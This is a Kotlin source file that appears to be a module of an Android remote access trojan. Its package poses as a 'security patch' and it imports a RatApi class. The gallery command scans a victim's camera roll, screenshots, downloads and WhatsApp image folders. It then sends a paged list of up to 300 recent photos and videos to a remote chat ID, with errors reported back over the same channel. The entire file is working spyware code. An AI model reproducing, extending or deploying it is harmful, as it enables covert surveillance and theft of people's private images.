package com.android.security.patch.commands

import android.content.Context
import com.android.security.patch.Pager
import com.android.security.patch.RatApi
import java.io.File

object Gallery {

    private val IMG = setOf("jpg","jpeg","png","gif","webp","bmp","heic")
    private val VID = setOf("mp4","mov","avi","mkv","3gp","webm")

    fun open(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase() ?: "all"
        Thread {
            try {
                val roots = when (mode) {
                    "cam","camera" -> listOf(File("/sdcard/DCIM/Camera"))
                    "ss","screenshot","screen" -> listOf(
                        File("/sdcard/DCIM/Screenshots"),
                        File("/sdcard/Pictures/Screenshots")
                    )
                    "dl","download" -> listOf(File("/sdcard/Download"))
                    "wa","whatsapp" -> listOf(
                        File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
                        File("/sdcard/WhatsApp/Media/WhatsApp Images"),
                        File("/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images"),
                        File("/sdcard/WhatsApp Business/Media/WhatsApp Images")
                    )
                    else -> listOf(
                        File("/sdcard/DCIM/Camera"),
                        File("/sdcard/DCIM/Screenshots"),
                        File("/sdcard/Pictures"),
                        File("/sdcard/Download")
                    )
                }

                val files = mutableListOf<File>()
                roots.forEach { r ->
                    if (r.exists() && r.isDirectory) {
                        r.walkTopDown().maxDepth(3).forEach { f ->
                            if (f.isFile) {
                                val ext = f.extension.lowercase()
                                if (ext in IMG || ext in VID) files.add(f)
                            }
                        }
                    }
                }

                val sorted = files.sortedByDescending { it.lastModified() }.take(300)
                val items = sorted.map { f ->
                    val tag = if (f.extension.lowercase() in VID) "🎬" else "🖼"
                    val kb = f.length() / 1024
                    Pager.Item("$tag ${f.name} (${kb}KB)", "file:${f.absolutePath}")
                }
                val s = Pager.Session("gallery", "🖼 gallery ($mode) — ${items.size}", items)
                val msgId = Pager.sendPagePublic(ctx, chatId, s)
                if (msgId != null) Pager.register(msgId, s)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "gallery err: ${e.message}", chatId)
            }
        }.start()
    }
}
